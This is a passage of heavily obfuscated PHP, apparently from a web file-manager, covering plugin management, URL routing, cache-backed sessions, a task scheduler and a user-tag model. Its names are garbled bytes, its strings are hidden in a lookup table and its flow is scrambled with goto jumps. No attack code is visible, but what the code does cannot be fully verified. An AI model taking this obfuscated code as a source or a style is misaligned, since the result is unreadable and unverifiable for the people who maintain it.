!is_array($DÒ÷¢’[$E•ê›ğô[1850]]) || $DÒ÷¢’[$E•ê›ğô[745]] != 1 || !is_file($CŸ Åùõéé)) { return !1; } if ($GLOBALS[$E•ê›ğô[499]] == 1) { return !0; } if ($Ağ²‰™òŞà && !Action($E•ê›ğô[1853])->checkAuth($f°ŸÊ·Ã±Á)) { return !1; } return !0; } public function unInstall($DŞÑ’…Šáñ) { $b‡£Ëõ„‚Õ =& $_SERVER[›é¼±]; $E ­‘ÕÌ¼¾ = $this->loadList($DŞÑ’…Šáñ); if (file_exists(PLUGIN_DIR . $DŞÑ’…Šáñ)) { Hook::apply($DŞÑ’…Šáñ . $b‡£Ëõ„‚Õ[1854]); } $this->remove($E ­‘ÕÌ¼¾[$b‡£Ëõ„‚Õ[395]]); } public function changeStatus($b¸ò—Òß¿”, $fÃ®ÒäÍÛî) { $E™Í¿öÎ =& $_SERVER[›é¼±]; $bÅ÷´£æÄ = $this->loadList($b¸ò—Òß¿”); if ($fÃ®ÒäÍÛî) { Hook::apply($b¸ò—Òß¿” . $E™Í¿öÎ[1855]); } $this->update($bÅ÷´£æÄ[$E™Í¿öÎ[395]], array($E™Í¿öÎ[1856] => $fÃ®ÒäÍÛî)); } public function appRegist($fÚÃË”è‡‘, $e„‰İÁ·…„) { $dó·ŸÀŠÏæ =& $_SERVER[›é¼±]; $f½Ÿ‰ø­¾ö = $this->loadList($fÚÃË”è‡‘); if ($f½Ÿ‰ø­¾ö) { $this->update($f½Ÿ‰ø­¾ö[$dó·ŸÀŠÏæ[395]], array($dó·ŸÀŠÏæ[1850] => $e„‰İÁ·…„)); } else { $EíÊöÎÄ‘ = array($dó·ŸÀŠÏæ[28] => $fÚÃË”è‡‘, $dó·ŸÀŠÏæ[1850] => $e„‰İÁ·…„, $dó·ŸÀŠÏæ[745] => 0, $dó·ŸÀŠÏæ[6] => $this->getConfigDefault($fÚÃË”è‡‘)); $this->insert($EíÊöÎÄ‘); } } public function getConfigDefault($F²’¼Í§‘‚) { $EÄôà“³İ± =& $_SERVER[›é¼±]; $d„‘¢ßÙ† = array(); $BŞŠÂˆŞ›é = $this->getPackageJson($F²’¼Í§‘‚); if (!$BŞŠÂˆŞ›é && is_array($BŞŠÂˆŞ›é[$EÄôà“³İ±[1857]])) { return $d„‘¢ßÙ†; } foreach ($BŞŠÂˆŞ›é[$EÄôà“³İ±[1857]] as $b«íø‘Úî => $Aˆ³†‚õê¾) { if (!isset($Aˆ³†‚õê¾[$EÄôà“³İ±[372]]) || isset($d„‘¢ßÙ†[$b«íø‘Úî])) { continue; } $d„‘¢ßÙ†[$b«íø‘Úî] = $Aˆ³†‚õê¾[$EÄôà“³İ±[372]]; } return $d„‘¢ßÙ†; } public function getPackageJson($Eİ‡‘Ü‰à‰) { return Hook::apply($Eİ‡‘Ü‰à‰ . $_SERVER[›é¼±][1858]); } public function getConfig($a¸’Ò´†¯©, $Dî·Ã×Ã÷ = false) { $AŸù«ñ«…˜ =& $_SERVER[›é¼±]; $d ¯´—÷Âî = array(); $bŞïæ¾‰ = $this->loadList($a¸’Ò´†¯©); if ($bŞïæ¾‰ && is_array($bŞïæ¾‰[$AŸù«ñ«…˜[6]])) { $d ¯´—÷Âî = $bŞïæ¾‰[$AŸù«ñ«…˜[6]]; } if (!$d ¯´—÷Âî || $Dî·Ã×Ã÷) { $d ¯´—÷Âî = $this->getConfigDefault($a¸’Ò´†¯©); } return $d ¯´—÷Âî; } public function setConfig($b¦¼éí²òã, $c·¬¿¦˜Úã = false) { goto Cîõ…ÛÏ‘¬; Cîõ…ÛÏ‘¬: $eæØ­Öáß¡ =& $_SERVER[›é¼±]; $f¼÷…Ö¸‹ = $this->loadList($b¦¼éí²òã); if (!$f¼÷…Ö¸‹) { return !1; } goto C•§·Úº¹¸; C•§·Úº¹¸: $bÊÉ±³Éâ = $f¼÷…Ö¸‹[$eæØ­Öáß¡[6]]; if ($c·¬¿¦˜Úã == !1) { $bÊÉ±³Éâ = array(); $c·¬¿¦˜Úã = $this->getConfigDefault($b¦¼éí²òã); } foreach ($c·¬¿¦˜Úã as $aĞóåÊËñ¶ => $Fğ¸àâºâË) { $bÊÉ±³Éâ[$aĞóåÊËñ¶] = is_string($Fğ¸àâºâË) ? trim($Fğ¸àâºâË) : $Fğ¸àâºâË; } goto A¥‡®­ìĞÎ; A¥‡®­ìĞÎ: $this->update($f¼÷…Ö¸‹[$eæØ­Öáß¡[395]], array($eæØ­Öáß¡[6] => $bÊÉ±³Éâ)); goto aø¦‰÷ñì; aø¦‰÷ñì: } public function viewList() { goto EæğÌòÚ¶ƒ; cÌ±Ò­·Ç: return $cµ•÷ºùßĞ; goto EÈŒÍ£ö—¨; EæğÌòÚ¶ƒ: $A˜Öª£¼Ÿ‹ =& $_SERVER[›é¼±]; $B¬ÜŞ¤Ôá = $this->loadList(); $this->pluginScan($B¬ÜŞ¤Ôá); goto Fˆ›¹ºÆÚº; Fˆ›¹ºÆÚº: $B¬ÜŞ¤Ôá = $this->loadPluginList(); $cµ•÷ºùßĞ = array(); foreach ($B¬ÜŞ¤Ôá as $b‡Áã—ŞÀÙ => $eÌ¾Œ‹á…±) { unset($eÌ¾Œ‹á…±[$A˜Öª£¼Ÿ‹[1850]], $eÌ¾Œ‹á…±[$A˜Öª£¼Ÿ‹[6]]); $CãÏˆŒ‚Öƒ = PLUGIN_DIR . $eÌ¾Œ‹á…±[$A˜Öª£¼Ÿ‹[28]] . $A˜Öª£¼Ÿ‹[1852]; if (!is_file($CãÏˆŒ‚Öƒ)) { continue; } $aªÓŠ á˜ = Hook::apply($eÌ¾Œ‹á…±[$A˜Öª£¼Ÿ‹[28]] . $A˜Öª£¼Ÿ‹[1858]); if (is_array($aªÓŠ á˜)) { $cµ•÷ºùßĞ[$b‡Áã—ŞÀÙ] = array_merge($eÌ¾Œ‹á…±, $aªÓŠ á˜); } } goto cÌ±Ò­·Ç; EÈŒÍ£ö—¨: } private function loadPluginList() { $aê£±µ— =& $_SERVER[›é¼±]; $BÁ‚šô¸Ú = $this->loadList(); if (strtolower(MOD) == $aê£±µ—[1859]) { return $BÁ‚šô¸Ú; } $aã…Œç˜†Ş = Hook::trigger($aê£±µ—[1860], $BÁ‚šô¸Ú); if ($BÁ‚šô¸Ú && !$aã…Œç˜†Ş) { die; } return $aã…Œç˜†Ş ? $aã…Œç˜†Ş : $BÁ‚šô¸Ú; } private function pluginScan($b©Ò÷öØƒÃ) { $c®¢ß„…ÓÁ =& $_SERVER[›é¼±]; recursion_dir(PLUGIN_DIR, $DŒ•‚š¤¨¾, $BåÀêÊï‰´, 0); foreach ($DŒ•‚š¤¨¾ as $BùŒ‡¯³) { $b‹·ßá‰Âñ = get_path_this($BùŒ‡¯³); if (isset($b©Ò÷öØƒÃ[$b‹·ßá‰Âñ]) || !file_exists($BùŒ‡¯³ . $c®¢ß„…ÓÁ[1861]) || !file_exists($BùŒ‡¯³ . $c®¢ß„…ÓÁ[1852])) { continue; } Hook::apply($b‹·ßá‰Âñ . $c®¢ß„…ÓÁ[1855]); } } } goto C—ÉÒ›ÀóÃ; a•¾ïÙåèÔ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\x5e\x2f\x5d\53", "\x3a\156\x75\155" => "\133\x30\x2d\71\x5d\x2b", "\72\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($EÊõ®¬Ïäª, $cçõ°Ñ÷») { $c´¼ƒÍÀß =& $_SERVER[›é¼±]; if ($EÊõ®¬Ïäª == $c´¼ƒÍÀß[1512]) { $Eá‡¢»Õ©ç = array_map($c´¼ƒÍÀß[1513], $cçõ°Ñ÷»[0]); $EòÒˆ„ğñ‰ = strpos($cçõ°Ñ÷»[1], $c´¼ƒÍÀß[8]) === 0 ? $cçõ°Ñ÷»[1] : $c´¼ƒÍÀß[8] . $cçõ°Ñ÷»[1]; $d´Ô–¹Áì® = $cçõ°Ñ÷»[2]; } else { $Eá‡¢»Õ©ç = null; $EòÒˆ„ğñ‰ = strpos($cçõ°Ñ÷»[0], $c´¼ƒÍÀß[8]) === 0 ? $cçõ°Ñ÷»[0] : $c´¼ƒÍÀß[8] . $cçõ°Ñ÷»[0]; $d´Ô–¹Áì® = $cçõ°Ñ÷»[1]; } array_push(self::$maps, $Eá‡¢»Õ©ç); array_push(self::$routes, $EòÒˆ„ğñ‰); array_push(self::$methods, strtoupper($EÊõ®¬Ïäª)); array_push(self::$callbacks, $d´Ô–¹Áì®); } public static function error($fª°àõó†ò) { self::$errorCallback = $fª°àõó†ò; } public static function haltOnMatch($C›¿šˆíµ… = true) { self::$halts = $C›¿šˆíµ…; } public static function dispatch() { goto eºªõ…³Ù; d³é†İøáµ: $EÍÀÃÆÊ®ó = array_keys(static::$patterns); $B•å÷¦’Å‰ = array_values(static::$patterns); $EãåóËšÁ = !1; goto dÚÆÈ¬Á×“; eºªõ…³Ù: $Dß‚·Šù¼è =& $_SERVER[›é¼±]; $aàí‘‡Å = parse_url($_SERVER[$Dß‚·Šù¼è[1514]], PHP_URL_PATH); $eØ¯ñĞ’ÆÜ = $_SERVER[$Dß‚·Šù¼è[157]]; goto d³é†İøáµ; dÚÆÈ¬Á×“: self::$routes = preg_replace($Dß‚·Šù¼è[1197], $Dß‚·Šù¼è[8], self::$routes); if (in_array($aàí‘‡Å, self::$routes)) { $b ±¢õÍ¶ = array_keys(self::$routes, $aàí‘‡Å); foreach ($b ±¢õÍ¶ as $f¶ƒŒ›Ñ˜ƒ) { if (self::$methods[$f¶ƒŒ›Ñ˜ƒ] == $eØ¯ñĞ’ÆÜ || self::$methods[$f¶ƒŒ›Ñ˜ƒ] == $Dß‚·Šù¼è[1515] || in_array($eØ¯ñĞ’ÆÜ, self::$maps[$f¶ƒŒ›Ñ˜ƒ])) { $EãåóËšÁ = !0; if (!is_object(self::$callbacks[$f¶ƒŒ›Ñ˜ƒ])) { $b¦ã•ù¬Ñ = explode($Dß‚·Šù¼è[8], self::$callbacks[$f¶ƒŒ›Ñ˜ƒ]); $EÔ§„‘è¶Ö = end($b¦ã•ù¬Ñ); $f®ˆ¶Ì»Ïó = explode($Dß‚·Šù¼è[1516], $EÔ§„‘è¶Ö); $AùÄ³—¯—  = new $f®ˆ¶Ì»Ïó[0](); $AùÄ³—¯— ->{$f®ˆ¶Ì»Ïó[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$f¶ƒŒ›Ñ˜ƒ]); if (self::$halts) { return; } } } } } else { $CèÈøÇÜ¿‘ = 0; foreach (self::$routes as $f¶ƒŒ›Ñ˜ƒ) { if (strpos($f¶ƒŒ›Ñ˜ƒ, $Dß‚·Šù¼è[4]) !== !1) { $f¶ƒŒ›Ñ˜ƒ = str_replace($EÍÀÃÆÊ®ó, $B•å÷¦’Å‰, $f¶ƒŒ›Ñ˜ƒ); } if (preg_match($Dß‚·Šù¼è[1517] . $f¶ƒŒ›Ñ˜ƒ . $Dß‚·Šù¼è[1518], $aàí‘‡Å, $bÂÖ íÉÓâ)) { if (self::$methods[$CèÈøÇÜ¿‘] == $eØ¯ñĞ’ÆÜ || self::$methods[$CèÈøÇÜ¿‘] == $Dß‚·Šù¼è[1515] || !empty(self::$maps[$CèÈøÇÜ¿‘]) && in_array($eØ¯ñĞ’ÆÜ, self::$maps[$CèÈøÇÜ¿‘])) { $EãåóËšÁ = !0; array_shift($bÂÖ íÉÓâ); if (!is_object(self::$callbacks[$CèÈøÇÜ¿‘])) { $b¦ã•ù¬Ñ = explode($Dß‚·Šù¼è[8], self::$callbacks[$CèÈøÇÜ¿‘]); $EÔ§„‘è¶Ö = end($b¦ã•ù¬Ñ); $f®ˆ¶Ì»Ïó = explode($Dß‚·Šù¼è[1516], $EÔ§„‘è¶Ö); $AùÄ³—¯—  = new $f®ˆ¶Ì»Ïó[0](); if (!method_exists($AùÄ³—¯— , $f®ˆ¶Ì»Ïó[1])) { echo $Dß‚·Šù¼è[1519]; } else { call_user_func_array(array($AùÄ³—¯— , $f®ˆ¶Ì»Ïó[1]), $bÂÖ íÉÓâ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$CèÈøÇÜ¿‘], $bÂÖ íÉÓâ); if (self::$halts) { return; } } } } $CèÈøÇÜ¿‘++; } } if ($EãåóËšÁ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $d’ ¯¿°‘£ =& $_SERVER[›é¼±]; header($_SERVER[$d’ ¯¿°‘£[1520]] . $d’ ¯¿°‘£[1521]); echo $d’ ¯¿°‘£[1522]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Dß‚·Šù¼è[1514]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto bàÛÄ§Üó; bàÛÄ§Üó: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eŸ•Î‡–¼Š; cœÆ ²é‰À: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $eÍ‡ÈÃô‰Ù = new self(); return $eÍ‡ÈÃô‰Ù; goto DØò‰¸‹Øè; cøÚœÏ¹×: $aóÜîÙŞçÊ = $cöçºÂŒ÷[$c¯ªŠÂƒ×]; $bš¼×ìÍ½á = $cöçºÂŒ÷[$e¿°­Šˆ†Ğ[830]]; switch ($c¯ªŠÂƒ×) { case $e¿°­Šˆ†Ğ[17]: self::$handle = Model($e¿°­Šˆ†Ğ[831]); break; case $e¿°­Šˆ†Ğ[832]: self::$handle = new CacheRedis($aóÜîÙŞçÊ, $bš¼×ìÍ½á); break; case $e¿°­Šˆ†Ğ[833]: self::$handle = new CacheMemcached($aóÜîÙŞçÊ, $bš¼×ìÍ½á); break; case $e¿°­Šˆ†Ğ[193]: $aóÜîÙŞçÊ[$e¿°­Šˆ†Ğ[76]] = $aóÜîÙŞçÊ[$e¿°­Šˆ†Ğ[76]] . $e¿°­Šˆ†Ğ[1526]; self::$handle = new CacheFile($aóÜîÙŞçÊ, $bš¼×ìÍ½á); default: break; } goto cœÆ ²é‰À; C·Óâ”ù: if (self::$sessionSign) { } else { if (Cookie::get($F•±âØ“…À)) { self::$sessionSign = Cookie::get($F•±âØ“…À); } else { self::$sessionSign = guid(); } } Cookie::setSafe($F•±âØ“…À, self::$sessionSign, self::$sessionTime); $c¯ªŠÂƒ× = $cöçºÂŒ÷[$e¿°­Šˆ†Ğ[1525]]; goto cøÚœÏ¹×; cğ¿Êõè: $cöçºÂŒ÷ = $GLOBALS[$e¿°­Šˆ†Ğ[6]][$e¿°­Šˆ†Ğ[347]]; self::$sessionTime = $cöçºÂŒ÷[$e¿°­Šˆ†Ğ[1523]]; $F•±âØ“…À = isset($GLOBALS[$e¿°­Šˆ†Ğ[1524]]) ? $GLOBALS[$e¿°­Šˆ†Ğ[1524]] : SESSION_ID; goto C·Óâ”ù; eŸ•Î‡–¼Š: $e¿°­Šˆ†Ğ =& $_SERVER[›é¼±]; static $eÍ‡ÈÃô‰Ù = false; if ($eÍ‡ÈÃô‰Ù) { return $eÍ‡ÈÃô‰Ù; } goto cğ¿Êõè; DØò‰¸‹Øè: } public static function sign($Eğ˜Ö‹ö‡» = false) { $Eğ˜Ö‹ö‡» && (self::$sessionSign = $Eğ˜Ö‹ö‡»); self::init(); return self::$sessionSign; } public static function set($B»Æ—à’Ü, $C¢‰ŒÇÍÁİ = false) { self::init(); if (is_array($B»Æ—à’Ü)) { foreach ($B»Æ—à’Ü as $a¬¯¥ãçÄ… => $C®“£µ¶¤«) { array_set_value(self::$data, $a¬¯¥ãçÄ…, $C®“£µ¶¤«); } } else { array_set_value(self::$data, $B»Æ—à’Ü, $C¢‰ŒÇÍÁİ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($eÏæ±ŠìË = false) { self::init(); if (!$eÏæ±ŠìË) { return self::$data; } return array_get_value(self::$data, $eÏæ±ŠìË); } public static function remove($F¼¿¶Â) { self::init(); unset(self::$data[$F¼¿¶Â]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[›é¼±][835])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto C¢¨½æ§…å; E‹¨†²œ‘±: while (!0) { self::cacheClear(); if (self::valueGet($aÊàµÒæßç[745]) != $aÊàµÒæßç[87]) { self::valueSet($aÊàµÒæßç[1527], $aÊàµÒæßç[191]); self::log($aÊàµÒæßç[1531]); die; } self::valueSet($aÊàµÒæßç[1527], $aÊàµÒæßç[87]); self::valueSet($aÊàµÒæßç[1528], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto DˆˆÕ‡½¨Û; C¢¨½æ§…å: $aÊàµÒæßç =& $_SERVER[›é¼±]; if (self::valueGet($aÊàµÒæßç[745]) != $aÊàµÒæßç[87]) { return; } if (self::valueGet($aÊàµÒæßç[1527]) == $aÊàµÒæßç[87]) { $BØÀ¹˜Ñ³› = self::valueGet($aÊàµÒæßç[1528]); if (time() - $BØÀ¹˜Ñ³› > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto DÜ½“Ç”®; DÜ½“Ç”®: http_close(); self::valueSet($aÊàµÒæßç[1527], $aÊàµÒæßç[87]); Hook::bind($aÊàµÒæßç[1529], $aÊàµÒæßç[1530]); goto E‹¨†²œ‘±; DˆˆÕ‡½¨Û: } public static function restart() { $d£†ƒ°Ğ¥¯ =& $_SERVER[›é¼±]; http_close(); self::valueSet($d£†ƒ°Ğ¥¯[745], $d£†ƒ°Ğ¥¯[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($d£†ƒ°Ğ¥¯[1527], $d£†ƒ°Ğ¥¯[191]); self::valueSet($d£†ƒ°Ğ¥¯[745], $d£†ƒ°Ğ¥¯[87]); } public static function shutdownEvent() { $aªŠ”ËŸè =& $_SERVER[›é¼±]; self::valueSet($aªŠ”ËŸè[1527], $aªŠ”ËŸè[191]); self::log($aªŠ”ËŸè[1532]); } public static function config($CôŒ¢Œ›, $EªßĞéˆ† ) { self::valueSet($_SERVER[›é¼±][745], $CôŒ¢Œ›); } private static function taskRunAll() { goto BµÂ­çöè; bŠâ»Ä£¤À: self::taskQueueRun($bªï†èËŒ); goto dåƒ‹Ãƒ®ø; aƒ‡ªŒ¢ºù: $E¶Ğ¢¯ŠŠ = count($A¡éíÚèéö); for ($aŠˆÈ‰¯… = 0; $aŠˆÈ‰¯… < $E¶Ğ¢¯ŠŠ; $aŠˆÈ‰¯…++) { $F’‘¨ÒÙùÛ = $A¡éíÚèéö[$aŠˆÈ‰¯…]; if (!$F’‘¨ÒÙùÛ[$BŞ±ÒÒ‡Ç§[395]] || $F’‘¨ÒÙùÛ[$BŞ±ÒÒ‡Ç§[1534]] != $BŞ±ÒÒ‡Ç§[87]) { continue; } if (!self::taskTimeCheck($F’‘¨ÒÙùÛ)) { continue; } self::taskRun($F’‘¨ÒÙùÛ); } Hook::trigger($BŞ±ÒÒ‡Ç§[1535]); goto bŠâ»Ä£¤À; BµÂ­çöè: $BŞ±ÒÒ‡Ç§ =& $_SERVER[›é¼±]; $bªï†èËŒ = timeFloat(); $A¡éíÚèéö = Model($BŞ±ÒÒ‡Ç§[1533])->listData(); goto aƒ‡ªŒ¢ºù; dåƒ‹Ãƒ®ø: } private static function taskQueueRun($A­–Ö©ôõ¬) { $E÷äŒ·«ù› = 10; while (!0) { $Dî¾ùß±„ø = TaskQueue::run(); if ($Dî¾ùß±„ø === !1) { break; } if (timeFloat() - $A­–Ö©ôõ¬ >= $E÷äŒ·«ù›) { break; } } } private static function taskTimeCheck($e²ÎÏïì˜) { goto bØÂŞ³íòÂ; FƒºêåòÓ´: $c˜¯¼’¯Èë = strtotime($f‰­¬¦—ëß[1536] . $f…ƒğ‹˜Û‚[$f‰­¬¦—ëß[1537]] . $f‰­¬¦—ëß[1538]) - strtotime($f‰­¬¦—ëß[1539]); $e‰‘ô˜°§‚ = time() - strtotime(date($f‰­¬¦—ëß[1540]) . $f‰­¬¦—ëß[1541]); $CĞùí½­Õ = $e‰‘ô˜°§‚ >= $c˜¯¼’¯Èë && $e‰‘ô˜°§‚ <= $c˜¯¼’¯Èë + 3600; goto a‹İÑ–‰§¤; bØÂŞ³íòÂ: $f‰­¬¦—ëß =& $_SERVER[›é¼±]; $f…ƒğ‹˜Û‚ = json_decode($e²ÎÏïì˜[$f‰­¬¦—ëß[197]], !0); $C­°³ğÊÀ¦ = intval($e²ÎÏïì˜[$f‰­¬¦—ëß[1528]]); goto FƒºêåòÓ´; a‹İÑ–‰§¤: switch ($f…ƒğ‹˜Û‚[$f‰­¬¦—ëß[29]]) { case $f‰­¬¦—ëß[1542]: if (time() - $C­°³ğÊÀ¦ < 3600 * 24 * 30) { return !1; } if ($f…ƒğ‹˜Û‚[$f‰­¬¦—ëß[1542]] == date($f‰­¬¦—ëß[1543]) && $CĞùí½­Õ) { return !0; } break; case $f‰­¬¦—ëß[1544]: if (time() - $C­°³ğÊÀ¦ < 3600 * 24 * 7) { return !1; } $FôµÚµ‘ = date($f‰­¬¦—ëß[1545]) == 0 ? 7 : date($f‰­¬¦—ëß[1545]); if ($f…ƒğ‹˜Û‚[$f‰­¬¦—ëß[1544]] == $FôµÚµ‘ && $CĞùí½­Õ) { return !0; } break; case $f‰­¬¦—ëß[1537]: if (time() - $C­°³ğÊÀ¦ < 3600 * 24) { return !1; } if ($CĞùí½­Õ) { return !0; } break; case $f‰­¬¦—ëß[1546]: if (time() - $C­°³ğÊÀ¦ >= floatval($f…ƒğ‹˜Û‚[$f‰­¬¦—ëß[1546]]) * 60) { return !0; } break; default: break; } return !1; goto bùÄ©Š®å; bùÄ©Š®å: } private static function closeDatabase() { goto Dõå§ÑõÜÛ; DÚë¥ÉÅ»: $f± …–ùÓ„ = Model($Aí•„—‰Û[507])->db($Aí•„—‰Û[33]); if ($f± …–ùÓ„) { $f± …–ùÓ„->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($Aí•„—‰Û[1547], $Aí•„—‰Û[1548]); die; } goto a«ßñ÷ğğø; Dõå§ÑõÜÛ: $Aí•„—‰Û =& $_SERVER[›é¼±]; static $aàªøƒì›Ï = 0; $Fó—©Şâ˜™ = 300; goto DƒëçèÕ´; DƒëçèÕ´: if (!$aàªøƒì›Ï) { $aàªøƒì›Ï = time(); } if (time() - $aàªøƒì›Ï < $Fó—©Şâ˜™) { return; } $aàªøƒì›Ï = time(); goto DÚë¥ÉÅ»; a«ßñ÷ğğø: } public static function taskRun($f¼å¼«ŒÇä) { goto Cäò´ø‚˜É; E‘Ãß¤ôÇ: $fÙ‡ï©†²Ä = timeFloat(); $bÆïæ˜‡°» = $e‘œì‘ö„œ[33]; switch ($f¼å¼«ŒÇä[$e‘œì‘ö„œ[29]]) { case $e‘œì‘ö„œ[305]: $AÀ÷ÆêÓŞ = url_request($f¼å¼«ŒÇä[$e‘œì‘ö„œ[1552]], $e‘œì‘ö„œ[228], !1, !1, !1, !1, 10); if ($AÀ÷ÆêÓŞ[$e‘œì‘ö„œ[745]]) { $bÆïæ˜‡°» = strlen($AÀ÷ÆêÓŞ[$e‘œì‘ö„œ[1121]]); } break; case $e‘œì‘ö„œ[227]: $bÆïæ˜‡°» = Hook::apply($f¼å¼«ŒÇä[$e‘œì‘ö„œ[1552]]); default: break; } goto C†Ş¡º‹‚Û; C†Ş¡º‹‚Û: Model($e‘œì‘ö„œ[1553])->add(array($e‘œì‘ö„œ[1554] => $e‘œì‘ö„œ[33], $e‘œì‘ö„œ[1555] => $e‘œì‘ö„œ[191], $e‘œì‘ö„œ[29] => $e‘œì‘ö„œ[1556] . $f¼å¼«ŒÇä[$e‘œì‘ö„œ[395]], $e‘œì‘ö„œ[1557] => json_encode(array($e‘œì‘ö„œ[28] => $f¼å¼«ŒÇä[$e‘œì‘ö„œ[28]], $e‘œì‘ö„œ[1558] => timeFloat() - $fÙ‡ï©†²Ä, $e‘œì‘ö„œ[291] => $bÆïæ˜‡°»)))); $E÷’—´˜Á = $bÆïæ˜‡°» ? $e‘œì‘ö„œ[1559] . $bÆïæ˜‡°» : $e‘œì‘ö„œ[33]; self::log($e‘œì‘ö„œ[1560] . $f¼å¼«ŒÇä[$e‘œì‘ö„œ[395]] . $e‘œì‘ö„œ[530] . $E÷’—´˜Á); goto eß¯—Æó­; Cäò´ø‚˜É: $e‘œì‘ö„œ =& $_SERVER[›é¼±]; self::log($e‘œì‘ö„œ[1549] . $f¼å¼«ŒÇä[$e‘œì‘ö„œ[395]] . $e‘œì‘ö„œ[1550] . $f¼å¼«ŒÇä[$e‘œì‘ö„œ[28]] . $e‘œì‘ö„œ[1551] . $f¼å¼«ŒÇä[$e‘œì‘ö„œ[1552]]); Model($e‘œì‘ö„œ[1533])->run($f¼å¼«ŒÇä[$e‘œì‘ö„œ[395]]); goto E‘Ãß¤ôÇ; eß¯—Æó­: return !0; goto d¹„êšÀ; d¹„êšÀ: } private static function valueGet($b–©¡âòæ) { $c±ÃˆŒ½°° =& $_SERVER[›é¼±]; $FÚ×ã³°• = $c±ÃˆŒ½°°[1561]; $F«º¿™Ã›‡ = Model($c±ÃˆŒ½°°[427])->get($b–©¡âòæ, $FÚ×ã³°•); if (is_null($F«º¿™Ã›‡)) { Model($c±ÃˆŒ½°°[427])->set($c±ÃˆŒ½°°[745], $c±ÃˆŒ½°°[87], $FÚ×ã³°•); Model($c±ÃˆŒ½°°[427])->set($c±ÃˆŒ½°°[1527], $c±ÃˆŒ½°°[191], $FÚ×ã³°•); $F«º¿™Ã›‡ = Model($c±ÃˆŒ½°°[427])->get($b–©¡âòæ, $FÚ×ã³°•); } return $F«º¿™Ã›‡; } private static function valueSet($DÛöÅøÌ¦á, $F‡†ßöĞÄ) { $c’İµ¸Ñê° =& $_SERVER[›é¼±]; $f·İ×¡åö = $c’İµ¸Ñê°[1562]; CacheLock::lock($f·İ×¡åö); $dà»ˆ¨ïñÃ = Model($c’İµ¸Ñê°[427])->set($DÛöÅøÌ¦á, $F‡†ßöĞÄ, $c’İµ¸Ñê°[1561]); CacheLock::unlock($f·İ×¡åö); return $dà»ˆ¨ïñÃ; } protected static function log($AŒê«„Ş°) { write_log($AŒê«„Ş°, $_SERVER[›é¼±][1548]); } private static function cacheClear() { $F®—­‡ìÚ× =& $_SERVER[›é¼±]; Cache::clearMemory(Model($F®—­‡ìÚ×[427])->cacheKey($F®—­‡ìÚ×[1561])); Cache::clearMemory(Model($F®—­‡ìÚ×[427])->cacheKey($F®—­‡ìÚ×[1563])); Model($F®—­‡ìÚ×[1533])->cacheClear(); self::closeDatabase(); } } goto EõÜÈ…ä›Ñ; eÃ§·ßà÷†: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($B˜…–ĞŒ‚¹) { $eŞ¸ƒÉÌŒ =& $_SERVER[›é¼±]; return array($eŞ¸ƒÉÌŒ[1840] => array(USER_ID, $eŞ¸ƒÉÌŒ[1841])); } protected function listData() { $D£÷…ƒÊ =& $_SERVER[›é¼±]; $eè„ÒÉŸ„² = array($D£÷…ƒÊ[1555] => USER_ID, $D£÷…ƒÊ[477] => array($D£÷…ƒÊ[1844], 0)); $D‰¾ô²Ã¾ï = $D£÷…ƒÊ[1846]; $cÒ¹ƒœ±Š = $this->field($D‰¾ô²Ã¾ï)->where($eè„ÒÉŸ„²)->order($D£÷…ƒÊ[1847])->select(); return $cÒ¹ƒœ±Š ? $cÒ¹ƒœ±Š : array(); } protected function listByTag($Dƒ¡é´Ú) { } protected function addToTag($aÅ·øâÙèë, $e½ ßè‡Œ) { $d°ùŸ•é‚Œ =& $_SERVER[›é¼±]; if (!Model($d°ùŸ•é‚Œ[1980])->listData($e½ ßè‡Œ) || !Model($d°ùŸ•é‚Œ[827])->pathInfo($aÅ·øâÙèë)) { return !1; } $AæåŸ´”’Í = array($d°ùŸ•é‚Œ[1555] => USER_ID, $d°ùŸ•é‚Œ[477] => $e½ ßè‡Œ, $d°ùŸ•é‚Œ[416] => $aÅ·øâÙèë, $d°ùŸ•é‚Œ[417] => $d°ùŸ•é‚Œ[411], $d°ùŸ•é‚Œ[415] => $d°ùŸ•é‚Œ[33], $d°ùŸ•é‚Œ[1737] => 0); if ($this->where($AæåŸ´”’Í)->find()) { return !1; } return $this->add($AæåŸ´”’Í); } protected function removeFromTag($E¼£Í¾ºœ™, $C×è¦Çíù) { $f‚ò£ë‘“š =& $_SERVER[›é¼±]; if (!Model($f‚ò£ë‘“š[1980])->listData($C×è¦Çíù)) { return !1; } if (is_array($E¼£Í¾ºœ™)) { $E¼£Í¾ºœ™ = array($f‚ò£ë‘“š[7], $E¼£Í¾ºœ™); } $bÔŸ ’¶‡ = array($f‚ò£ë‘“š[1555] => USER_ID, $f‚ò£ë‘“š[477] => $C×è¦Çíù, $f‚ò£ë‘“š[417] => $f‚ò£ë‘“š[411], $f‚ò£ë‘“š[416] => $E¼£Í¾ºœ™); return $this->where($bÔŸ ’¶‡)->delete(); } protected function removeByTag($C¯ìñîí’á) { $bÔÙÔ—´•Ş =& $_SERVER[›é¼±]; if 